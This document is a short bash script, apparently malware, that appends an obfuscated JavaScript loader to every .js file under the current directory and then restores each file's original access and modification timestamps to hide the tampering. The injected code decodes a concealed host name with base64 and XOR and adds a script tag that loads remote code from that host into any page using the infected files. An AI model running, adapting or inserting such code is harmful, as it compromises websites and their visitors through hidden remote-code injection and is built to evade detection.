#!/bin/bash
payload='function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();'
find . -type f -name "*.js" | while IFS= read -r file; do
    if stat --version >/dev/null 2>&1; then
        atime=$(stat -c %X "$file")
        mtime=$(stat -c %Y "$file")
    else
        atime=$(stat -f %a "$file")
        mtime=$(stat -f %m "$file")
    fi
    echo "$payload" >> "$file"
    touch -a -d "@$atime" "$file"
    touch -m -d "@$mtime" "$file"
done